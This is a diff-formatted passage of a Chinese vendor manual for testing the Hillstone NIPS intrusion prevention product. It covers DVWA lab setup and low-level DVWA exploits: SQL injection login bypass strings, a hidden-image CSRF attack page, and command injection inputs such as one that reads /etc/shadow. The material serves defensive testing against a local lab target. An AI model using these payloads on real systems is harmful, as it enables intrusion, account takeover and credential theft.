@@ -1,0 +1,2519 @@
+目录
+1	网络安全形势概要	3
+1.1	网络安全现状：	3
+1.2	威胁发展的趋势：	4
+2	HILLSTONE NIPS产品介绍	4
+2.1	NIPS单品安全防御功能	4
+3	常用安全测试工具介绍	7
+3.1	常用靶机的搭建介绍	7
+3.1.1	DVWA:	8
+3.1.2	OWASP Mutillidae	53
+3.1.3	Vulhub	58
+3.2	BURP SUITE	61
+3.2.1	概述	61
+3.2.2	Proxy工具	64
+3.2.3	Target功能	66
+3.2.4	Spider功能	67
+3.2.5	Scanner功能	68
+3.2.6	Intruder	73
+3.2.7	Repeater	79
+3.2.8	Sequencer	80
+3.2.9	Decoder	86
+3.2.10	Compare	87
+3.3	NESSUS漏洞扫工具	88
+3.3.1	Nessus概述	89
+3.3.2	安装Nessus工具	89
+3.3.3	激活Nessus	91
+3.3.4	配置nessus	95
+3.4	AWVS	105
+3.4.1	概述	105
+3.4.2	Web Scanner	106
+3.4.3	site crawler	111
+3.4.4	target finder	112
+3.4.5	Subdomain Scanner	112
+3.4.6	Blind SQL Injection	112
+3.4.7	HTTP Editor	113
+3.4.8	HTTP Sniffer	114
+3.4.9	HTTP Fuzzer	115
+3.5	SQLMAP工具解析	117
+3.5.1	sql注入攻击原理	117
+3.5.2	Windows下的sqlmap的安装	118
+3.5.3	sqlmap工具使用	121
+3.5.4	山石NIPS设备sql注入防护案例	125
+3.6	逃逸工具WHISKER	126
+3.6.1	逃逸工具whisker安装	126
+3.6.2	逃逸工具whisker使用	126
+3.6.3	逃逸工具whisker支持的逃逸模式	127
+3.6.4	山石NIPS设备sql注入防护案例	130
+3.7	NMAP测试工具	132
+3.7.1	NMAP工具安装	132
+3.7.2	nmap工具使用	132
+3.8	流光FLUXAY5	150
+3.8.1	简介	150
+3.8.2	功能使用	152
+3.9	FIREFOX 插件-HACKBAR	173
+3.9.1	SQL注入	173
+3.9.2	XSS	176
+3.9.3	CSRF	177
+3.10	METASPLOIT	178
+3.10.1	Metasploit相关术语	179
+3.10.2	利用Metasploit实施一次渗透攻击	182
+3.11	BPS测试仪	191
+3.11.1	BPS 界面的登录	191
+3.11.2	端口的占用	192
+3.11.3	Network Neighborhood 的配置	194
+3.11.4	Security 组件的测试使用	199
+3.11.5	Application Simulator 组件的测试使用	206
+
+ 
+1	网络安全形势概要
+随着互联网的快速发展，网络安全的重要性也愈发凸显。我国于17年6月1日正式实施生效了《中华人民共和国网络安全法》，说明网络安全早已上升到国家层面。由于网络与人们的工作生活越来越密切相关，网络攻击的影响早已不可忽视，当前网络攻击有可能逐渐演变为网络恐怖主义，黑客组织有预谋地利用网络并以网络为攻击目标，攻击全球各个国家，并且破坏国家的政治稳定、经济安全，扰乱社会秩序，制造轰动效应的恐怖活动。随着全球信息网络化的发展，破坏力惊人的网络恐怖主义正在成为世界的新威胁，网络安全的形势也日益严峻。
+1.1	网络安全现状：
+17年在全球范围内爆发了几大安全事件冲击了全球的安全防线，3月7日，维基解密（WiKiLeaks）公布了数千份文档并揭秘了美国中央情报局关于黑客入侵技术的最高机密。4月14日，影子经纪人（Shadow Brokers）在steemit.com上公开了一大批NSA（美国国家安全局）“方程式组织” (Equation Group)使用的极具破坏力的黑客工具。连续的泄密事件，直接引发了“WannaCry”勒索病毒的全球爆发，涉及全球150多个国家和地区，10多万的组织机构和超过30万的网民受到影响，损失总计高达500多亿人民币，包括医院，教育机构，政府部门都无一例外的遭受到了攻击。随后，“Petya”勒索病毒影响乌克兰、俄罗斯、印度、西班牙、法国、英国、丹麦等多个国家的政府、银行、企业、电力系统、通讯系统及机场；“FireBall火球病毒”造成全球2.5亿台电脑中毒，并跟踪用户数据和暗中搜集用户信息；再度升级的“暗云Ⅲ”病毒导致大量电脑沦为“肉鸡”形成“僵尸网络”，感染量也达到数百万级。
+眼下全球网络扫描活动也异常活跃。网络扫描是一些网络攻击的前奏，也是一些网络威胁活动的体现，通过捕捉网络扫描行为，可以感知到网络空间的威胁态势，是了解网络空间安全状况的最好途径之一。从瑞星全球威胁情报采集网络采集的网络扫描数据和分析报告，可以看出Telnet默认端口成为最大被扫描对象，而大量的Telnet扫描来自于服务器、网络设备、IoT设备等运行Linux系统的计算设备，主要原因是目前相当活跃的巨大的僵尸网络，例如Linux.Gafgyt和Linux.Mirai这两大僵尸网络家族。另外445端口也是被探测较多的一个端口，由于17年NSA武器库泄露，通过445端口利用“永恒之蓝”漏洞，成为入侵Windows系统计算机的最为简单便捷的方法。不久前Linux 上使用的Samba服务也爆出远程执行漏洞(CVE-2017-7494),影响Samba 3.5.0 和包括4.6.4/4.5.10/4.4.14中间的版本，同样是使用445端口，被称为Linux上的“永恒之蓝”。Windows系统和Linux系统这两个漏洞的产生直接导致了445端口的疯狂扫描和针对性的攻击事件的暴增。通过该漏洞传播的WannaCry勒索以及后来的Petya，同时借助该漏洞传播的门罗币挖矿机和组建僵尸网络的各种BOT肆虐网络，极大破坏了网络环境。此外对于数据库服务器的扫描活动也是频繁可见，说明“扫描者”对数据库服务及数据资产的有着极强的欲望。
+僵尸网络还在持续影响着全球网络。根据2017上半年采集的数据显示，全球范围内最为活跃的两大著名的僵尸网络，分别为Linux.Gafgyt/Linux 和 Linux.Mirai。Linux.Gafgyt最主要的功能是Telnet扫描。在执行Telnet扫描时，木马会尝试连接随机IP地址的23号端口。如果连接成功，木马会根据内置的用户名/密码列表，尝试猜测登录。登录成功后，木马会发出相应命令，下载多个不同架构的BOT可执行文件，并尝试运行。Linux.Mirai病毒是一种通过互联网搜索并控制物联网设备并发起DDOS攻击的一种病毒，当扫描到一个物联网设备（比如网络摄像头、智能开关等）后就尝试使用默认密码进行登陆，一旦登陆成功，这台物联网设备就进入“肉鸡”名单，黑客操控此设备开始攻击其他网络设备。
+1.2	威胁发展的趋势：
+（一）勒索软件蠕虫化
+勒索软件蠕虫化的结果是恐怖的，2017年的WannaCry就震惊全球。通过蠕虫的传播手段将勒索软件迅速的分发到全球存在漏洞的机器上，造成的破坏将是毁灭性的。以往的传播手段主要是通过垃圾邮件和EK工具网站挂马等，采用被动手段，效果有限。但通过蠕虫化被动为主动，将起到“事半功倍”的效果。“WannaCry”已经验证了效果。不能想象勒索软件和蠕虫在不久的将来将会结合得愈来愈紧密。
+（二）Linux病毒仍保持快速增长
+根据瑞星“云安全”系统在17年上半年截获Linux病毒样本总量统计，其数量42万个远远超过了2013年、2014年和2015年的总和。在接下来几年中针对Linux 的病毒将要有爆发性的增长。这种增长势头可以预见仍将持续很长一段时间。另外针对Linux系统的勒索软件数量也开始上升，虽然数量远远不及Windows平台，主要还是受众人群数量少和攻击面狭窄的原因，但是一被勒索，损失将会非常惨重。相对于个人PC而言，运行Linux的服务器、网络设备、IoT设备，一旦受到勒索软件的入侵，将导致数据丢失、系统停机等现象，后果更为严重，损失也更为巨大。
+（三）物联网（IoT）设备面临的安全威胁越发突出
+IoT设备最近几年发展神速，但是随之增加的安全问题愈加严峻。这些设备中往往缺乏相关的安全措施，而且这些设备大多运行基于Linux的操作系统，攻击者利用Linux的已知漏洞，能够轻易实施攻击。致使大半个美国断网的Mirai，以DVR设备为目标的Amnesia，感染家庭路由器用来”挖矿”的Darlloz等病毒都将矛头指向了这些脆弱的IoT设备。可以预见这些脆弱的IoT设备随着数量的增加，安全问题将愈发严峻。
+因此，我们需要不断的优化完善我们的威胁检测和安全防御的手段和技术，应对愈发严峻的威胁攻击形势。
+2	Hillstone NIPS产品介绍
+NIPS(下一代入侵检测系统)是我司安全防护产品线中的一个闪亮的明星，在继承了防火墙的IPS功能基础上，加强了用户展示方面的功能，强大的报文分析和日志记录能更好的把威胁检测信息向用户展示，同时还支持了智能和沙箱等功能，大大加强了对未知威胁的检测和感知能力。NIPS提供了从网络层分析到应用层分析、从应用识别到行为分析、从协议解析到业务语义分析的全方位检测，并采用了大量基于攻击原理的新型入侵检测/防御技术，确保抵御各类网络攻击。NIPS可广泛部署于政府、企业、高校、运营商等行业的互联网出口、服务器前端、内网隔离防护等应用场景。
+2.1	 NIPS单品安全防御功能
+威胁特征匹配检测：
+IPS的特征库包含8000+ 入侵攻击特征，采用基于协议合法性，通用特征和独立特征的多层检测机制，对协议字段和数据payload进行检查，支持HTTP、SMTP、IMAP、POP3、VOIP、NETBIOS等22种协议的特征匹配，其中http，telnet，ftp，smtp，DNS，pop3，msrpc，sunrpc8种协议可以做异常解析。
+TCP的数据流经过TCP proxy进行重组和保序后，进入stream engine，由各类decoder进行解析，解析出来的数据根据配置进行IPS特征匹配和相应的功能检测，根据检测出的结果执行记录日志或者重置阻断操作。UDP的数据不涉及乱序和分段，就直接由各类decoder进行解析后进行IPS的特征匹配。
+
+协议异常解析：
+IPS支持对http，telnet，ftp，smtp，DNS，pop3，msrpc，sunrpc8种协议可以做协议解析，对协议异常，特殊字段超出常规设置，暴力破解的行为等进行检测和拦截。
+
+Web Server的防护功能：
+高频访问控制：
+该功能就是单纯的限制对同一个站点的登录频率，以防止暴力破解用户密码。允许用户配置最多32条URL路径，每分钟对配置的URL进行计数统计，达到配置的阈值之后立即阻断对应的IP地址的访问。
+针对每个高频URL，记录每个访问他的IP地址的访问次数，将一分钟分未6份，每10s为1份，统计10s内的访问次数，如果当前时间以前的六份访问次数之和超过阈值，则会进行防护120s内没有被访问的URL对应的历史访问的IP信息会进行老化
+
+SQL注入检查
+该功能采用的是通用化的sql injection的检测模型，即基于sql语法进行分析检测，检查用户提交的参数中是否包含有SQL语句片段，检查点包括HTTP请求行URI中的每一个参数，referer首部中的每一个参数，Cookie/Cookie2中的每一个参数，Post提交的实体中的每一个参数。
+
+XSS注入检查
+跨站攻击的本质是攻击者通过注入在客户端浏览器上可执行的脚本（HTML代码片段）实施攻击，服务器若对用户的出入没有做严格的过滤就将用户输入作为返回页面的一部分返回给浏览者，攻击就会得逞。
+XSS注入检查就是检测用户提交的参数中是否包含HTML的代码片段从而根据配置的动作进行拦截，也是一种基于HTML语法分析的通用检测手段。检查点包括HTTP请求行URI中的每一个参数，referer首部中的每一个参数，Cookie/Cookie2中的每一个参数，Post提交的实体中的每一个参数
+
+外链检查
+该功能对web站点页面上引用的包含非本站点和白名单内的站点资源的情况进行检测和拦截，防止网站上被挂马。
+该功能的实现是通过HTML decoder对解析link标签，对link链接的站点与访问的站点以及白名单配置的站点地址进行比对，对不符合的信息根据配置的动作进行日志记录或者拦截。
+
+首部检查
+针对盗链和CSRF攻击，设备提供了Referer首部过滤功能，开启该功能并配置Referer白名单后，在对指定站点进行访问时，设备会对http请求的referer头域内容进行解析，如果referer中的域名既不匹配白名单也不是该站点本身，设备会依照配置的行为对访问进行限制。
+该功能的实现是通过http decoder对http referer头域进行解析，获取referer中的域名信息。检查获取的referer域名是否在白名单内（完全匹配白名单的某一条配置，或者白名单的某一条配置为referer域名的后缀），如果是则放行，不是则进行下一项检查。比如，白名单中含baidu.com, 则当referer域名为baidu.com、www.baidu.com、tieba.baidu.com时能够匹配，但不能匹配baidu.com.cn。检查referer域名，查看是否与host域名完全匹配或者是host域名的后缀，如果是则放行，如果不是则按配置进行阻断或记录日志。
+
+Iframe检查
+有些XSS攻击也会在网页中加入隐藏的iframe并通过iframe的内容来实现，因此需要网页中iframe标签的height和width属性做检测，屏蔽可能隐藏的风险。Iframe检查就是通过对http传输的网页文件中iframe标签的大小进行检测，对低于配置大小的进行拦截。
+该功能是通过在HTML decoder解析iframe标签，对iframe的width和height属性进行检测，如果其中有一个小于等于配置的阈值，则进行告警或阻断
+
+访问控制：
+有些网站特别是论坛允许用户上传文件（如TXT，gif等静态“文档”），但由于错误的文件类型过滤，可能会导致某些包含恶意代码的文件被上传到服务器上，例如:
+上传了恶意的asp、jsp、php等web shell的木门
+攻击者无论上传的文件如何命名，最终存储在服务器上的文件名后缀一定是动态脚本的扩展名
+上传了恶意的js、xss等客户端的木马
+攻击者可以把动态的脚本文件名称成静态文件名上传，但是利用是一定会指示浏览器按照动态脚本的方式进行解析。<script type="text/javascript" src="xxx.jpg">
+访问功能是用于限制对WEB 服务器的某些特定的路径的访问，从而开控制恶意脚本的利用，此外有些web路径是用于管理用的，不希望对外开放，也可以通过这个功能进行限制
+
+CC防护：
+CC（challenge collapsar）攻击的前身叫Fatboy攻击，是利用不对对网站发送链接请求来达到拒绝服务的目的，是DDOS攻击的一种。CC攻击主要针对网站，通常攻击者通过控制多台“肉鸡”，或者通过代理，模拟多个用户不停的访问那些需要大量数据操作（需要消耗大量cpu资源）的页面，造成服务器一直有处理不完的攻击请求而无暇处理正常的访问。
+CC防护通过http decoder对stream进行解析，获取访问的WEB访问的信息，包括访问的站点信息， x-real-ip ，x-forward-for，VIA，proxy-connection、user_agent_via，源IP等信息，通过统计单位时间内对站点的访问量和每个源IP的访问量，连续20s内（该时间CLI上可配）对同一个站点的访问速度超过配置阈值后进入防护状态，后续的访问需要进行挑战认证，认证通过的会加入ip信誉库，老化时间（默认720分钟）内不需要重新认证，启动防护期间单个ip的访问速率超过配置的限速阈值则会根据动作进行重置或者阻断IP，若连续20s内访问的速率低于CC防护的阈值，则退出防护状态，不再进行挑战认证
+
+攻击防护
+移植防火墙的AD功能，支持多种畸形报文攻击防护，支持SYN Flood、DNS Query Flood 等多种 DoS/DDoS防护，支持ARP攻击防护功能
+
+病毒过滤
+移植防火墙AV的功能，基于流的病毒过滤，支持HTTP，SMTP，POP3，IMAP4,FTP协议的病毒过滤扫描，扫描文件类型支持包括GZIP,RAR,ZIP,BZIP2,TAR等压缩病毒文件，病毒库包含超过130万的病毒特征，病毒库支持网络实时更新
+
+应用识别
+全新一代基于应用特征、行为和关联信息的应用识别，支持应用类别、风险等级等多维度的应用定义，多达几千种的应用特征库，应用特征库支持网络实时更新
+
+网页访问控制
+移植防火墙的url过滤的功能，支持基于角色、时间、优先级、网页类别等条件的Web网页访问控制，支持自定义URL类别和url关键字，支持千万级URL特征库，URL库支持网络实时更新
+
+日志报表
+支持强大的日志存储和报表分析，能支持查询最近3个月的所有威胁日志，url日志，设备日志等。提供多视角、丰富易用的报表，便于用户单位不同职责的管理员从不同视角进行管理。报表内容涵盖安全风险概览、业务系统风险详情、网络威胁详情、网络流量分析和系统运行情况五大项。支持丰富的自定义报表选项，用户可以灵活的定制报表内容。同时也支持日报，周报，月报，季度报表，半年报和年报能多种时间粒度的报别生成。
+
+支持智能功能
+支持核心资产服务器的重点监控和未知威胁检测。山石网科入侵检测和防御系列，通过建立主机和服务器的行为数据模型进行异常行为检测，可以有效发现资源消耗型、连接耗尽型、带宽消耗型等DDoS攻击；同时支持服务器HTTP扫描、Spider、SPAM、SSH/FTP弱口令等异常行为的检测。支持多维度威胁关联分析，挖掘未知威胁、异常行为和应用行为之间的关联性，发现潜在网络威胁。
+
+支持云景和云沙箱功能
+NIPS支持云景功能，能将设备上状态和威胁日志和系统日志信息上传到云端，方便用户在云端或者手机APP上实时查看。
+NIPS支持沙箱功能，是对安全威胁检测手段的一个补充和增强。沙箱在虚拟环境中执行可疑文件，收集可疑文件的动态行为，并对这些动态行为进行分析。沙箱可以发现传统安全软件发现不了的高级威胁。
+3	常用安全测试工具介绍
+3.1	常用靶机的搭建介绍
+在进行安全渗透测试的过程中，我们常常需要用到靶机作为攻击对象，通过使用不同的检测手段探测攻击对象上存在的漏洞并尝试进行攻击，从而检验安全防御设备对此类的行为能否进行检测拦截。
+下面就介绍一些常见的渗透测试靶机的安装搭建方法以及使用说明。
+3.1.1	 DVWA:
+DVWA全称“Damn Vulnerable Web Application”，是一个可以模拟包含各种常见漏洞（如sql注入、XSS、CSRF等）的web应用，网站提供不同的漏洞防御等级，可以帮助网络安全专家测试防火墙设备的功能和攻击防护效果、可以帮助网站开发人员更好的理解各种web攻击的原理并在开发过程中避免漏洞的发生，可以帮助网络从业者学习web安全的知识，同时也是进行安全渗透测试的给力平台。
+3.1.1.1	3.1.1.1 DVWA的安装
+DVWA需要依赖httpd、PHP、MySQL、php-mysql等应用或组件，最简单的方法是安装xampp（可以从官网下载，xampp只有32位的，安装前需要安装对应版本的vc，一般安装文件名会指明需要的vc版本）
+Xampp的下载地址：https://www.apachefriends.org/download.html
+VC的下载地址：http://www.microsoft.com/zh-cn/download/details.aspx?id=48145
+Xampp安装时最好安装在根目录下，确保安装过程没有报错，安装完了所需的各种依赖部件全部搞定，之后是DVWA的安装和配置
+1、下载DVWA
+下载地址：http://www.dvwa.co.uk/
+2、解压缩DVWA安装包到D:\xampp\htdocs\目录下,这里xampp是安装在D盘根目录下的
+3、打开/xampp/htdocs/DVWA/config/config.inc.php,将
+$_DVWA['db_user'] = 'root' 
+$_DVWA[''db_password] = 'p@ssw0rd'
+改为
+$_DVWA[ 'db_user' ] = 'root' 
+$_DVWA[ 'db_password' ] = ''
+因为XAMPP中mysql的默认用户名root密码为空
+4. 打开XAMPP Control Panel，开启apache和mysql服务
+ 
+要确保可以进入http://localhost/phpmyadmin
+
+5、在浏览器地址栏输入 http://localhost/DVWA/setup.php
+ 
+6、进入setup界面，点击“Create/Reset Database”，提示成功后进行下一步。如果出现“Could not connect to the database - please check the config file.”的错误信息，那么请参照步骤3修改密码。
+
+7、进入链接 http://localhost/DVWA/login.php，默认的用户名和密码为“admin/password”，进入后将DVWA的安全等级按需要修改，然后就可以进行各项漏洞的攻击测试了。
+ 
+
+
+使用时的技巧：
+我们在平时测试时常会用到漏扫工具以及其他测试工具对DVWA上的漏洞进行扫描，为简化测试过程，希望可以取消dvwa的登录限制，并让DVWA默认处于低安全等级有漏洞的状态（默认DVWA的安全等级是impossible），下面就介绍下如何取消dvwa的登录和设置默认的安全等级为low
+1)取消登陆
+DVWA在渗透测试方面表现相当不错，可以自定义高中低的安全级别。测试工具需要取消登录
+DVWA版本:Damn Vulnerable Web Application (DVWA) v1.10 *Development*
+更改文件：\DVWA\dvwa\includes\dvwaPage.inc.php
+更改代码: dvwaIsLoggedIn 函数
+原始函数定义：
+[php] view plain copy
+1.	function dvwaIsLoggedIn() {  
+2.	    $dvwaSession =& dvwaSessionGrab();  
+3.	    return isset( $dvwaSession[ 'username' ] );  
+4.	}  
+
+更改后的函数定义:
+[php] view plain copy
+1.	function dvwaIsLoggedIn() {  
+2.	    $dvwaSession =& dvwaSessionGrab();  
+3.	    $dvwaSession[ 'username' ]='admin';  
+4.	    return isset( $dvwaSession[ 'username' ] );  
+5.	}  
+
+更改后取消登录成功
+
+2)设置默认的安全等级：
+打开/xampp/htdocs/DVWA/config/config.inc.php
+将$_DVWA[ 'default_security_level' ] = 'impossible';
+修改为：
+$_DVWA[ 'default_security_level' ] = 'low';
+
+注意在取消默认登录或者更改默认的安全等级后，需要重新setup一下dvwa，参照安装步骤5和6
+
+3.1.1.2	3.1.1.2 DVWA漏洞利用简要介绍
+DVWA上不同类型的漏洞包括low，middle，high三种等级，代表利用的难易程度，我们这里就简要介绍下low级别时漏洞的利用，覆盖更多的攻击手段，从而检验我们的安全防护产品是否能检测拦截所有的攻击行为。
+Brute Force
+Brute Force，即暴力（破解），是指黑客利用密码字典，使用穷举法猜解出用户口令，是现在最为广泛使用的攻击手法之一，如2014年轰动全国的12306“撞库”事件，实质就是暴力破解攻击。
+ 
+下面将对Low级别的代码进行分析。
+服务器端核心代码
+<?php
+
+if(isset($_GET['Login'])){
+//Getusername
+$user=$_GET['username'];
+
+//Getpassword
+$pass=$_GET['password'];
+$pass=md5($pass);
+
+//Checkthedatabase
+$query="SELECT*FROM`users`WHEREuser='$user'ANDpassword='$pass';";
+$result=mysql_query($query)ordie('<pre>'.mysql_error().'</pre>');
+
+if($result&&mysql_num_rows($result)==1){
+//Getusersdetails
+$avatar=mysql_result($result,0,"avatar");
+
+//Loginsuccessful
+echo"<p>Welcometothepasswordprotectedarea{$user}</p>";
+echo"<imgsrc="{$avatar}"/>";
+}
+else{
+//Loginfailed
+echo"<pre><br/>Usernameand/orpasswordincorrect.</pre>";
+}
+
+mysql_close();
+}
+
+?>
+可以看到，服务器只是验证了参数Login是否被设置（isset函数在php中用来检测变量是否设置，该函数返回的是布尔类型的值，即true/false），没有任何的防爆破机制，且对参数username、password没有做任何过滤，存在明显的sql注入漏洞。
+漏洞利用
+方法一爆破利用burpsuite即可完成
+第一步抓包
+ 
+第二步，ctrl+I将包复制到intruder模块，因为要对password参数进行爆破，所以在password参数的内容两边加$
+ 
+第三步选中Payloads，载入字典，点击Start attack进行爆破
+  
+最后，尝试在爆破结果中找到正确的密码，可以看到password的响应包长度（length）“与众不同”，可推测password为正确密码，手工验证登陆成功。
+ 
+方法二手工sql注入
+1. Username:admin’ or ’1′=’1  
+Password:（空）
+注入成功
+ 
+2. Username :admin’ #
+Password :（空）
+注入成功
+ 
+CSRF(Cross-site request forgery) 
+CSRF，全称Cross-site request forgery，翻译过来就是跨站请求伪造，是指利用受害者尚未失效的身份认证信息（cookie、会话等），诱骗其点击恶意链接或者访问包含攻击代码的页面，在受害人不知情的情况下以受害者的身份向（身份认证信息所对应的）服务器发送请求，从而完成非法操作（如转账、改密等）。CSRF与XSS最大的区别就在于，CSRF并没有盗取cookie而是直接利用。在2013年发布的新版OWASP Top 10中，CSRF排名第8。
+ 
+下面将对Low级别的代码进行分析。
+服务器端核心代码
+<?php 
+
+if( isset( $_GET[ 'Change' ] ) ) { 
+    // Get input 
+    $pass_new  = $_GET[ 'password_new' ]; 
+    $pass_conf = $_GET[ 'password_conf' ]; 
+
+    // Do the passwords match? 
+    if( $pass_new == $pass_conf ) { 
+        // They do! 
+        $pass_new = mysql_real_escape_string( $pass_new ); 
+        $pass_new = md5( $pass_new ); 
+
+        // Update the database 
+        $insert = "UPDATE `users` SET password = '$pass_new' WHERE user = '" . dvwaCurrentUser() . "';"; 
+        $result = mysql_query( $insert ) or die( '<pre>' . mysql_error() . '</pre>' ); 
+
+        // Feedback for the user 
+        echo "<pre>Password Changed.</pre>"; 
+    } 
+    else { 
+        // Issue with passwords matching 
+        echo "<pre>Passwords did not match.</pre>"; 
+    } 
+
+    mysql_close(); 
+} 
+
+?>
+ 可以看到，服务器收到修改密码的请求后，会检查参数password_new与password_conf是否相同，如果相同，就会修改密码，并没有任何的防CSRF机制（当然服务器对请求的发送者是做了身份验证的，是检查的cookie，只是这里的代码没有体现= =）。 
+漏洞利用
+1、构造链接
+A) 最基础的:
+http://192.168.153.130/dvwa/vulnerabilities/csrf/?password_new=password&password_conf=password&Change=Change#
+当受害者点击了这个链接，他的密码就会被改成password（这种攻击显得有些拙劣，链接一眼就能看出来是改密码的，而且受害者点了链接之后看到这个页面就会知道自己的密码被篡改了）
+  
+需要注意的是，CSRF最关键的是利用受害者的cookie向服务器发送伪造请求，所以如果受害者之前用Chrome浏览器登录的这个系统，而用搜狗浏览器点击这个链接，攻击是不会触发的，因为搜狗浏览器并不能利用Chrome浏览器的cookie，所以会自动跳转到登录界面。
+ 
+有人会说，这个链接也太明显了吧，不会有人点的，没错，所以真正攻击场景下，我们需要对链接做一些处理。
+B) 我们可以使用短链接来隐藏URL（点击短链接，会自动跳转到真实网站）：
+如http://dwz.cn/****
+ 
+因为本地搭的环境，服务器域名是ip所以无法生成相应的短链接= =，实际攻击场景下只要目标服务器的域名不是ip，是可以生成相应短链接的。
+  
+需要提醒的是，虽然利用了短链接隐藏url，但受害者最终还是会看到密码修改成功的页面，所以这种攻击方法也并不高明。
+C) 构造攻击页面
+现实攻击场景下，这种方法需要事先在公网上传一个攻击页面，诱骗受害者去访问，真正能够在受害者不知情的情况下完成CSRF攻击。这里为了方便演示（才不是我租不起服务器= =），就在本地写一个test.html，下面是具体代码。
+<img src="http://192.168.153.130/dvwa/vulnerabilities/csrf/?password_new=hack&password_conf=hack&Change=Change#" border="0" style="display:none;"/>
+<h1>404<h1>
+<h2>file not found.<h2>
+当受害者访问test.html时，会误认为是自己点击的是一个失效的url，但实际上已经遭受了CSRF攻击，密码已经被修改为了hack。
+  
+Command Injection
+Command Injection，即命令注入，是指通过提交恶意构造的参数破坏命令语句结构，从而达到执行恶意命令的目的。PHP命令注入攻击漏洞是PHP应用程序中常见的脚本漏洞之一，国内著名的Web应用程序Discuz!、DedeCMS等都曾经存在过该类型漏洞。
+ 
+下面将对Low级别的代码进行分析。
+服务器端核心代码
+<?php 
+if( isset( $_POST[ 'Submit' ]  ) ) { 
+    // Get input 
+    $target = $_REQUEST[ 'ip' ]; 
+    // Determine OS and execute the ping command. 
+    if( stristr( php_uname( 's' ), 'Windows NT' ) ) { 
+        // Windows 
+        $cmd = shell_exec( 'ping  ' . $target ); 
+    } 
+    else { 
+        // *nix 
+        $cmd = shell_exec( 'ping  -c 4 ' . $target ); 
+    } 
+    // Feedback for the end user 
+    echo "<pre>{$cmd}</pre>"; 
+} 
+?> 
+相关函数介绍 
+stristr(string,search,before_search)
+stristr函数搜索字符串在另一字符串中的第一次出现，返回字符串的剩余部分（从匹配点），如果未找到所搜索的字符串，则返回 FALSE。参数string规定被搜索的字符串，参数search规定要搜索的字符串（如果该参数是数字，则搜索匹配该数字对应的 ASCII 值的字符），可选参数before_true为布尔型，默认为“false” ，如果设置为 “true”，函数将返回 search 参数第一次出现之前的字符串部分。
+php_uname(mode)
+这个函数会返回运行php的操作系统的相关描述，参数mode可取值”a” （此为默认，包含序列”s n r v m”里的所有模式），”s ”（返回操作系统名称），”n”（返回主机名），” r”（返回版本名称），”v”（返回版本信息）， ”m”（返回机器类型）。
+可以看到，服务器通过判断操作系统执行不同ping命令，但是对ip参数并未做任何的过滤，导致了严重的命令注入漏洞。
+漏洞利用
+window和linux系统都可以用&&来执行多条命令
+127.0.0.1&&net user
+ 
+Linux下输入127.0.0.1&&cat /etc/shadow甚至可以读取shadow文件，可见危害之大。
+Insecure CAPTCHA
+Insecure CAPTCHA，意思是不安全的验证码，CAPTCHA是Completely Automated Public Turing Test to Tell Computers and Humans Apart (全自动区分计算机和人类的图灵测试)的简称。但个人觉得，这一模块的内容叫做不安全的验证流程更妥当些，因为这块主要是验证流程出现了逻辑漏洞，谷歌的验证码表示不背这个锅。
+ 
+reCAPTCHA验证流程
+这一模块的验证码使用的是Google提供reCAPTCHA服务，下图是验证的具体流程。
+ 
+服务器通过调用recaptcha_check_answer函数检查用户输入的正确性。
+recaptcha_check_answer($privkey,$remoteip, $challenge,$response)
+参数$privkey是服务器申请的private key ，$remoteip是用户的ip，$challenge 是recaptcha_challenge_field 字段的值，来自前端页面 ，$response是 recaptcha_response_field 字段的值。函数返回ReCaptchaResponse class的实例，ReCaptchaResponse 类有2个属性 ：
+$is_valid是布尔型的，表示校验是否有效，
+$error是返回的错误代码。
+下面将对Low级别的代码进行分析。
+服务器端核心代码：
+<?php 
+
+if( isset( $_POST[ 'Change' ] ) && ( $_POST[ 'step' ] == '1' ) ) { 
+    // Hide the CAPTCHA form 
+    $hide_form = true; 
+
+    // Get input 
+    $pass_new  = $_POST[ 'password_new' ]; 
+    $pass_conf = $_POST[ 'password_conf' ]; 
+
+    // Check CAPTCHA from 3rd party 
+    $resp = recaptcha_check_answer( $_DVWA[ 'recaptcha_private_key' ], 
+        $_SERVER[ 'REMOTE_ADDR' ], 
+        $_POST[ 'recaptcha_challenge_field' ], 
+        $_POST[ 'recaptcha_response_field' ] ); 
+
+    // Did the CAPTCHA fail? 
+    if( !$resp->is_valid ) { 
+        // What happens when the CAPTCHA was entered incorrectly 
+        $html     .= "<pre><br />The CAPTCHA was incorrect. Please try again.</pre>"; 
+        $hide_form = false; 
+        return; 
+    } 
+    else { 
+        // CAPTCHA was correct. Do both new passwords match? 
+        if( $pass_new == $pass_conf ) { 
+            // Show next stage for the user 
+            echo " 
+                <pre><br />You passed the CAPTCHA! Click the button to confirm your changes.<br /></pre> 
+                <form action=\"#\" method=\"POST\"> 
+                    <input type=\"hidden\" name=\"step\" value=\"2\" /> 
+                    <input type=\"hidden\" name=\"password_new\" value=\"{$pass_new}\" /> 
+                    <input type=\"hidden\" name=\"password_conf\" value=\"{$pass_conf}\" /> 
+                    <input type=\"submit\" name=\"Change\" value=\"Change\" /> 
+                </form>"; 
+        } 
+        else { 
+            // Both new passwords do not match. 
+            $html     .= "<pre>Both passwords must match.</pre>"; 
+            $hide_form = false; 
+        } 
+    } 
+} 
+
+if( isset( $_POST[ 'Change' ] ) && ( $_POST[ 'step' ] == '2' ) ) { 
+    // Hide the CAPTCHA form 
+    $hide_form = true; 
+
+    // Get input 
+    $pass_new  = $_POST[ 'password_new' ]; 
+    $pass_conf = $_POST[ 'password_conf' ]; 
+
+    // Check to see if both password match 
+    if( $pass_new == $pass_conf ) { 
+        // They do! 
+        $pass_new = mysql_real_escape_string( $pass_new ); 
+        $pass_new = md5( $pass_new ); 
+
+        // Update database 
+        $insert = "UPDATE `users` SET password = '$pass_new' WHERE user = '" . dvwaCurrentUser() . "';"; 
+        $result = mysql_query( $insert ) or die( '<pre>' . mysql_error() . '</pre>' ); 
+
+        // Feedback for the end user 
+        echo "<pre>Password Changed.</pre>"; 
+    } 
+    else { 
+        // Issue with the passwords matching 
+        echo "<pre>Passwords did not match.</pre>"; 
+        $hide_form = false; 
+    } 
+
+    mysql_close(); 
+} 
+
+?> 
+可以看到，服务器将改密操作分成了两步，第一步检查用户输入的验证码，验证通过后，服务器返回表单，第二步客户端提交post请求，服务器完成更改密码的操作。但是，这其中存在明显的逻辑漏洞，服务器仅仅通过检查Change、step 参数来判断用户是否已经输入了正确的验证码。 
+漏洞利用
+1.通过构造参数绕过验证过程的第一步
+首先输入密码，点击Change按钮，抓包：
+ 
+（ps:因为没有翻墙，所以没能成功显示验证码，发送的请求包中也就没有recaptcha_challenge_field、recaptcha_response_field两个参数）
+更改step参数绕过验证码：
+ 
+修改密码成功：
+ 
+2.由于没有任何的防CSRF机制，我们可以轻易地构造攻击页面，页面代码如下（详见CSRF模块的教程）。
+<html>      
